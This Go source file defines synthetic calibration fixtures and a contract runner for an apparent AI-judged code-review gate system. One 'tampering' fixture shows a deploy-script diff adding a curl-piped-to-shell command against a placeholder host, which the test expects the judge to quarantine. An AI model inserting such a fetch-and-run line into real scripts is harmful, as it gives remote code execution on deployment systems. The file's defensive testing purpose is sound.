package evaluator

import (
	"context"
	"fmt"
	"io"
	"os"
	"regexp"
)

var semverModelRe = regexp.MustCompile(`^jev-[0-9]+\.[0-9]+\.[0-9]+$`)

// builtinCalibrationFixtures holds synthetic states for `foreman-kit evaluator-contract`
// in memory so no fixture files need to clutter .foreman-kit/.
var builtinCalibrationFixtures = map[string]any{
	"canary.failing.log": "---- [gate] backend:lint: ruff check .\n---- [pass] backend:lint (1s)\n---- [gate] backend:test: pytest -q\nFAILED tests/test_auth.py::test_session_expiry - AssertionError: 200 != 401\n1 failed, 317 passed in 39.8s\n---- [fail] backend:test (exit 1, 40s)\ngates: FAIL\n",
	"plan_review.good": map[string]any{
		"change":          "add-oauth-login",
		"goal":            "Allow users to sign in via OAuth 2.0",
		"proposal":        "# Proposal\n\n## Why\nUsers need single sign-on via OAuth 2.0.\n\n## What Changes\n- Add /auth/oauth/callback endpoint returning 302 session redirect.\n",
		"design":          "# Design\n\n## Goals\n- Validate state parameter and exchange code for token.\n",
		"tasks":           "## 1. Implementation\n- [ ] 1.1 Implement OAuth callback handler\n- [ ] 1.2 Add request test asserting 302 session creation\n",
		"delta_specs":     map[string]any{"auth": "## ADDED Requirements\n\n### Requirement: OAuth callback\nThe server SHALL exchange a valid authorization code for a user session.\n\n#### Scenario: Valid code\n- **WHEN** GET /auth/oauth/callback receives a valid code\n- **THEN** it creates a session and returns HTTP 302\n"},
		"canonical_specs": map[string]any{},
	},
	"plan_review.bad": map[string]any{
		"change":          "misc-improvements",
		"goal":            "Improve the app and fix things",
		"proposal":        "# Proposal\nMake the system faster, better, and also redesign billing and notifications.",
		"design":          "TBD",
		"tasks":           "- [ ] Do everything",
		"delta_specs":     map[string]any{"misc": "### Requirement: Be fast\n#### Scenario: Fast\n- **WHEN** used\n- **THEN** it is fast and user-friendly"},
		"canonical_specs": map[string]any{},
	},
	"failure_triage.flaky": map[string]any{
		"change":      "add-oauth-login",
		"gate_output": "dial tcp 127.0.0.1:5432: connect: connection refused (temporary database container restart)",
		"delta_specs": map[string]any{},
	},
	"failure_triage.defect": map[string]any{
		"change":      "add-oauth-login",
		"gate_output": "FAIL: Expected status 302, got 500 Internal Server Error (nil pointer dereference in OAuthCallbackHandler)",
		"delta_specs": map[string]any{},
	},
	"repair_progress.converging": map[string]any{
		"change":               "add-oauth-login",
		"previous_gate_output": "5 failed, 10 passed: TestOAuthState, TestOAuthToken, TestOAuthUser, TestOAuthRedirect, TestOAuthLogout",
		"gate_output":          "1 failed, 14 passed: TestOAuthLogout",
		"delta_specs":          map[string]any{},
	},
	"repair_progress.stalled": map[string]any{
		"change":               "add-oauth-login",
		"previous_gate_output": "3 failed: TestOAuthState, TestOAuthToken, TestOAuthUser",
		"gate_output":          "3 failed: TestOAuthState, TestOAuthToken, TestOAuthUser",
		"delta_specs":          map[string]any{},
	},
	"scenario_coverage.good": map[string]any{
		"change":      "invoice-csv-export",
		"delta_specs": map[string]any{"billing": "### Requirement: Export CSV\n#### Scenario: Valid period\n- **WHEN** GET /invoices/export?period=2026-10\n- **THEN** response is 200 text/csv"},
		"tasks":       "- [x] 1.1 Implement export and test",
		"repos": map[string]any{
			"backend": map[string]any{
				"files": []string{"export.go", "export_test.go"},
				"diff":  "+func TestExportCSVValidPeriod(t *testing.T) { res := Get(\"/invoices/export?period=2026-10\"); assert.Equal(t, 200, res.Code) }",
			},
		},
	},
	"scenario_coverage.bad": map[string]any{
		"change":      "invoice-csv-export",
		"delta_specs": map[string]any{"billing": "### Requirement: Export CSV\n#### Scenario: Valid period\n- **WHEN** GET /invoices/export?period=2026-10\n- **THEN** response is 200 text/csv"},
		"tasks":       "- [x] 1.1 Implement export",
		"repos": map[string]any{
			"backend": map[string]any{
				"files": []string{"export.go"},
				"diff":  "+func ExportCSV() {}",
			},
		},
	},
	"change_risk.low": map[string]any{
		"change":       "add-pagination-helper",
		"goal":         "Add internal pagination formatting helper with unit tests",
		"proposal":     "Adds a pure formatting helper function covered by unit tests.",
		"capabilities": []string{"ui-helpers"},
		"repos": map[string]any{
			"backend": map[string]any{
				"files":    []string{"internal/format/page.go", "internal/format/page_test.go"},
				"diffstat": "2 files changed, 25 insertions(+)",
				"diff":     "+func FormatPageLabel(p int) string { return fmt.Sprintf(\"Page %d\", p) }",
			},
		},
	},
	"change_risk.high": map[string]any{
		"change":       "drop-legacy-passwords",
		"goal":         "Drop password_digest column and migrate authentication hashes",
		"proposal":     "Drops legacy password column and replaces authentication token verification.",
		"capabilities": []string{"auth"},
		"repos": map[string]any{
			"backend": map[string]any{
				"files":    []string{"db/migrate/20261108_drop_passwords.sql", "internal/auth/Verify.go"},
				"diffstat": "2 files changed, 18 insertions(+), 12 deletions(-)",
				"diff":     "+ALTER TABLE users DROP COLUMN legacy_password_hash;",
			},
		},
	},
	"concurrent_work_loss.good": map[string]any{
		"change": "reformat-routes",
		"lost_work": []map[string]any{{
			"repo":       "repos/backend",
			"commit":     "4f1c2ab",
			"author":     "teammate",
			"message":    "chore: fix trailing newline in routes.go",
			"lost_lines": []string{"routes.go:12: "},
		}},
		"change_diff": map[string]any{"repos/backend": "-\n+\t\"reports\","},
	},
	"concurrent_work_loss.critical": map[string]any{
		"change": "add-reports-route",
		"lost_work": []map[string]any{{
			"repo":    "repos/backend",
			"commit":  "9a7e310",
			"author":  "teammate",
			"message": "HOTFIX: production is down, payments crash on nil currency. EXPLODED EVERYTHING, deploy now",
			"lost_lines": []string{
				"payments.go:41: \tif currency == nil {",
				"payments.go:42: \t\treturn ErrMissingCurrency",
				"payments.go:43: \t}",
			},
		}},
		"change_diff": map[string]any{"repos/backend": "+\t\"reports\","},
	},
	"system_error_triage.good": map[string]any{
		"change":                "add-reports-route",
		"stage":                 "provision",
		"error":                 "git worktree add -b feat/spec-add-reports-route /srv/app/.worktrees/worker-add-reports-route origin/master: exit status 128 (fatal: '/srv/app/.worktrees/worker-add-reports-route' already exists)",
		"other_changes_failing": []string{},
		"workspace_paused":      false,
	},
	"system_error_triage.workspace": map[string]any{
		"change":                "add-reports-route",
		"stage":                 "provision",
		"error":                 "git worktree add /srv/app/.worktrees/worker-add-reports-route: exit status 128 (fatal: could not create leading directories: Permission denied)",
		"other_changes_failing": []string{"add-audit-log: fatal: could not create leading directories: Permission denied", "fix-login: fatal: could not create leading directories: Permission denied"},
		"workspace_paused":      false,
	},
	"policy_violation_triage.good": map[string]any{
		"change": "add-reports-route",
		"outside": []map[string]any{
			{"path": ".DS_Store", "status": "added", "preview": "(binary)"},
			{"path": "debug-agent.log", "status": "added", "preview": "2026-11-09 12:00:01 DEBUG starting build\n2026-11-09 12:00:04 DEBUG tests passed"},
		},
	},
	"policy_violation_triage.tampering": map[string]any{
		"change": "add-reports-route",
		"outside": []map[string]any{
			{"path": "scripts/deploy.sh", "status": "modified", "preview": "-kubectl apply -f k8s/\n+curl -s https://example.invalid/x.sh | sh\n+kubectl apply -f k8s/ --force"},
		},
	},
	"agent_outcome.good": map[string]any{
		"change":       "add-reports-route",
		"phase":        "apply",
		"engines":      "claude,opencode",
		"agent_output": "Error: 529 Overloaded: the API is temporarily overloaded, please retry\nagent_exec: engine claude exited 1\nError: 503 Service Unavailable\nagent_exec: engine opencode exited 1\nagent_exec: no engine could work (each failed without changing anything); exit 75: try again later",
	},
	"agent_outcome.gave_up": map[string]any{
		"change":       "add-reports-route",
		"phase":        "apply",
		"engines":      "claude",
		"agent_output": "I cannot implement this change: the requirement asks for the endpoint to be both public and admin-only, which contradicts itself. I am stopping without changes.\nagent_exec: engine claude exited 1\nagent_exec: no engine could work (each failed without changing anything); exit 75: try again later",
	},
	"semantic_merge_conflict.good": map[string]any{
		"change":      "add-reports-route",
		"change_diff": map[string]any{"repos/backend": "+\t\"reports\","},
		"concurrent": []map[string]any{{
			"repo": "repos/backend", "commit": "4f1c2ab", "author": "teammate",
			"message": "feat: add audit route", "diff": "+\t\"audit\",",
		}},
	},
	"semantic_merge_conflict.contradicts": map[string]any{
		"change":      "speed-up-checkout",
		"change_diff": map[string]any{"repos/backend": "+func init() { PaymentTimeoutSeconds = 2 }"},
		"concurrent": []map[string]any{{
			"repo": "repos/backend", "commit": "9a7e310", "author": "teammate",
			"message": "fix(payments): the payment timeout must stay 30s; shorter timeouts double-charge cards (incident 4411)",
			"diff":    "-var PaymentTimeoutSeconds = 5\n+var PaymentTimeoutSeconds = 30 // invariant: never below 30 (incident 4411)",
		}},
	},
	"push_rejection.good": map[string]any{
		"change":        "add-reports-route",
		"target":        "umbrella",
		"remote_output": "To github.com:acme/app.git\n ! [rejected]        HEAD -> master (fetch first)\nerror: failed to push some refs\nhint: Updates were rejected because the remote contains work that you do not have locally.",
	},
	"push_rejection.policy": map[string]any{
		"change":        "add-reports-route",
		"target":        "umbrella",
		"remote_output": "remote: error: GH006: Protected branch update failed for refs/heads/master.\nremote: error: Required status check \"ci\" is expected.\n ! [remote rejected] HEAD -> master (protected branch hook declined)\nerror: failed to push some refs",
	},
	"proposal_review.good": map[string]any{
		"proposal": map[string]any{
			"change_name": "add-audit-log-filter",
			"description": "Add date-range filter to the audit log endpoint as listed in ROADMAP.md",
			"priority":    "normal",
			"source":      "roadmap",
		},
		"roadmap":               "- Add date-range filter to audit log endpoint",
		"existing_capabilities": []string{"audit-log"},
		"queued_changes":        []string{},
		"other_proposals":       []string{},
	},
	"proposal_review.bad": map[string]any{
		"proposal": map[string]any{
			"change_name": "rewrite-billing-and-delete-old-invoices",
			"description": "Rewrite Stripe billing, change pricing tiers, and purge old invoice records",
			"priority":    "high",
			"source":      "exploration",
		},
		"roadmap":               "- Add date-range filter to audit log endpoint",
		"existing_capabilities": []string{"audit-log", "billing"},
		"queued_changes":        []string{},
		"other_proposals":       []string{},
	},
}

// RunContract executes the offline and optional --live contract and calibration suite of the evaluator
// in pure Go without requiring external fixture files or the `jev` CLI binary.
func RunContract(ctx context.Context, root string, live bool, out io.Writer) int {
	if out == nil {
		out = os.Stdout
	}
	failures := 0
	check := func(label string, ok bool) {
		if ok {
			fmt.Fprintf(out, "  PASS  %s\n", label)
		} else {
			fmt.Fprintf(out, "  FAIL  %s\n", label)
			failures++
		}
	}

	fmt.Fprintln(out, "== Offline contract")
	pol, err := LoadPolicy(root)
	check("policy .foreman-kit/evaluator.yaml loads cleanly", err == nil && pol != nil)
	if pol == nil {
		fmt.Fprintln(out, "========================================================================")
		fmt.Fprintf(out, "evaluator contract: FAIL (%d)\n", failures)
		return failures
	}

	gateNames := []string{
		"canary",
		"change_risk",
		"concurrent_work_loss",
		"failure_triage",
		"system_error_triage",
		"policy_violation_triage",
		"agent_outcome",
		"semantic_merge_conflict",
		"push_rejection",
		"plan_review",
		"proposal_review",
		"repair_progress",
		"scenario_coverage",
		"task_priority",
	}
	for _, name := range gateNames {
		_, _, err := LoadGateTemplate(root, name, pol)
		check(fmt.Sprintf("%s questions pass strict validation", name), err == nil)
	}

	check(fmt.Sprintf("policy pins a versioned model (%s)", pol.Model), semverModelRe.MatchString(pol.Model))

	judge, err := NewJudge(root, nil)
	if err != nil {
		failures++
		return failures
	}

	gatesOrder := []string{"plan_review", "failure_triage", "repair_progress", "scenario_coverage", "change_risk", "concurrent_work_loss", "system_error_triage", "policy_violation_triage", "agent_outcome", "semantic_merge_conflict", "push_rejection", "proposal_review"}
	for _, gate := range gatesOrder {
		g := pol.Gates[gate]
		fixtureState := loadFirstFixture(gate)
		target := gate
		if g.File != "" {
			target = g.File
		}
		_, code, err := judge.EvaluateTemplate(ctx, target, fixtureState, g.Assert, true)
		check(fmt.Sprintf("%s: asserts and state dry-run cleanly", gate), err == nil && code == 0)
	}

	routingOK := validateRoutingRules(root, pol)
	check("routing rules name existing questions and options", routingOK)

	if live {
		fmt.Fprintf(out, "== Live calibration (model %s)\n", pol.Model)
		check("API key is present", judge.Available())

		canaryAsserts := []string{"all_gates_passed >= 0.8", "reports_failure <= 0.2"}
		canaryRes, rc, err := judge.EvaluateTemplate(ctx, "canary", nil, canaryAsserts, false)
		ansModel := ""
		if canaryRes != nil {
			ansModel = canaryRes.Model
		}
		check(fmt.Sprintf("canary: obvious yes passes (exit %d, model %s)", rc, ansModel), err == nil && rc == 0)
		check("canary: answered by the pinned model", ansModel == pol.Model)

		failLog, _ := builtinCalibrationFixtures["canary.failing.log"].(string)
		_, rc, _ = judge.EvaluateTemplate(ctx, "canary", failLog, canaryAsserts, false)
		check(fmt.Sprintf("canary: obvious no fails the gate (exit %d, expected 10)", rc), rc == 10)

		runGoodBad := func(gate, goodSuffix, badSuffix, passDesc, failDesc string) {
			g := pol.Gates[gate]
			goodState := builtinCalibrationFixtures[fmt.Sprintf("%s.%s", gate, goodSuffix)]
			_, rcGood, _ := judge.EvaluateTemplate(ctx, gate, goodState, g.Assert, false)
			check(fmt.Sprintf("%s: %s (exit %d)", gate, passDesc, rcGood), rcGood == 0)

			badState := builtinCalibrationFixtures[fmt.Sprintf("%s.%s", gate, badSuffix)]
			_, rcBad, _ := judge.EvaluateTemplate(ctx, gate, badState, g.Assert, false)
			check(fmt.Sprintf("%s: %s (exit %d)", gate, failDesc, rcBad), rcBad == 10)
		}

		runGoodBad("plan_review", "good", "bad", "good plan passes", "vague, bundled plan fails")

		for _, tc := range []struct {
			fixture  string
			expected string
			rule     *RoutingRule
			ruleName string
		}{
			{"flaky", "environment_or_flaky", pol.Gates["failure_triage"].RerunWhen, "rerun_when"},
			{"defect", "implementation_defect", nil, ""},
		} {
			st := builtinCalibrationFixtures[fmt.Sprintf("failure_triage.%s", tc.fixture)]
			res, _, err := judge.EvaluateTemplate(ctx, "failure_triage", st, nil, false)
			gotChoice := ""
			gotConf := 0.0
			if err == nil && res != nil {
				if cause, ok := res.Answers["cause"]; ok {
					gotChoice, _ = cause["choice"].(string)
					gotConf, _ = toFloat(cause["confidence"])
				}
			}
			check(fmt.Sprintf("failure_triage: %s log classified as %s (got %s @ %v)", tc.fixture, tc.expected, gotChoice, gotConf), gotChoice == tc.expected)
			if tc.rule != nil && tc.rule.MinConfidence != nil && gotConf < *tc.rule.MinConfidence {
				fmt.Fprintf(out, "  WARN  confidence %v is below %s.min_confidence %v: the rule would not fire\n", gotConf, tc.ruleName, *tc.rule.MinConfidence)
			}
		}

		for _, rc := range []struct {
			fixture string
			expect  string
		}{
			{"low", "no"},
			{"high", "yes"},
		} {
			st := builtinCalibrationFixtures[fmt.Sprintf("change_risk.%s", rc.fixture)]
			res, _, err := judge.EvaluateTemplate(ctx, "change_risk", st, nil, false)
			fired := "no"
			if err == nil && res != nil {
				v := Verdict{Gate: "change_risk", Answers: res.Answers}
				for i := range pol.Gates["change_risk"].BlockWhen {
					rule := pol.Gates["change_risk"].BlockWhen[i]
					if MatchesRule(v, &rule) {
						fired = "yes"
						break
					}
				}
			}
			check(fmt.Sprintf("change_risk: %s-risk fixture blocks=%s (got %s)", rc.fixture, rc.expect, fired), fired == rc.expect)
		}

		for _, wl := range []struct {
			fixture string
			expect  string
		}{
			{"good", "no"},
			{"critical", "yes"},
		} {
			st := builtinCalibrationFixtures[fmt.Sprintf("concurrent_work_loss.%s", wl.fixture)]
			res, _, err := judge.EvaluateTemplate(ctx, "concurrent_work_loss", st, nil, false)
			fired := "no"
			if err == nil && res != nil {
				if ShouldBlock(Verdict{Gate: "concurrent_work_loss", Answers: res.Answers}, pol.Gates["concurrent_work_loss"]) {
					fired = "yes"
				}
			}
			check(fmt.Sprintf("concurrent_work_loss: %s fixture blocks=%s (got %s)", wl.fixture, wl.expect, fired), fired == wl.expect)
		}

		for _, rc := range []struct {
			gate, fixture, expect string
		}{
			{"failure_triage", "flaky", "hold_environment"},
			{"failure_triage", "defect", "repair"},
			{"system_error_triage", "good", "block_change"},
			{"system_error_triage", "workspace", "pause"},
			{"policy_violation_triage", "good", "revert_and_continue"},
			{"policy_violation_triage", "tampering", "quarantine"},
			{"agent_outcome", "good", "defer"},
			{"agent_outcome", "gave_up", "needs_human"},
			{"semantic_merge_conflict", "good", "integrate"},
			{"semantic_merge_conflict", "contradicts", "send_back"},
			{"push_rejection", "good", "retry"},
			{"push_rejection", "policy", "needs_human"},
		} {
			st := builtinCalibrationFixtures[fmt.Sprintf("%s.%s", rc.gate, rc.fixture)]
			res, _, err := judge.EvaluateTemplate(ctx, rc.gate, st, nil, false)
			got := FallbackAction(rc.gate)
			if err == nil && res != nil {
				if a, _ := ActionFor(Verdict{Gate: rc.gate, Answers: res.Answers}, pol.Gates[rc.gate]); a != "" {
					got = a
				}
			}
			check(fmt.Sprintf("%s: %s fixture routes to %s (got %s)", rc.gate, rc.fixture, rc.expect, got), got == rc.expect)
		}

		runGoodBad("proposal_review", "good", "bad", "scoped roadmap feature is approved", "bundled, risky proposal waits for a human")
		runGoodBad("scenario_coverage", "good", "bad", "tests asserting every scenario pass", "a scenario without a real test goes back for repair")
		runGoodBad("repair_progress", "converging", "stalled", "narrower failures spend another round", "the same failures again stop the repairs")
	}

	fmt.Fprintln(out, "========================================================================")
	if failures == 0 {
		fmt.Fprintln(out, "evaluator contract: PASS")
	} else {
		fmt.Fprintf(out, "evaluator contract: FAIL (%d)\n", failures)
	}
	return failures
}

func validateRoutingRules(root string, pol *Policy) bool {
	for gateName, g := range pol.Gates {
		tf, _, err := LoadGateTemplate(root, gateName, pol)
		if err != nil {
			return false
		}
		var rules []RoutingRule
		if g.RerunWhen != nil {
			rules = append(rules, *g.RerunWhen)
		}
		if g.EscalateWhen != nil {
			rules = append(rules, *g.EscalateWhen)
		}
		rules = append(rules, g.BlockWhen...)
		rules = append(rules, g.AllowWhen...)
		rules = append(rules, g.Actions...)
		for _, r := range g.Actions {
			known := false
			for _, a := range GateActions[gateName] {
				known = known || a == r.Action
			}
			if !known {
				return false
			}
		}
		for _, r := range rules {
			q, ok := tf.RawQuestions[r.Question]
			if !ok {
				return false
			}
			if r.Choice != "" {
				if q.Type != "choice" {
					return false
				}
				if _, ok := q.ChoiceCriteria()[r.Choice]; !ok {
					return false
				}
			} else if q.Type != "noul" {
				return false
			}
		}
	}
	return true
}

func loadFirstFixture(gate string) any {
	for _, suffix := range []string{"good", "converging", "flaky", "low"} {
		if v, ok := builtinCalibrationFixtures[fmt.Sprintf("%s.%s", gate, suffix)]; ok {
			return v
		}
	}
	return map[string]any{"change": "synthetic"}
}
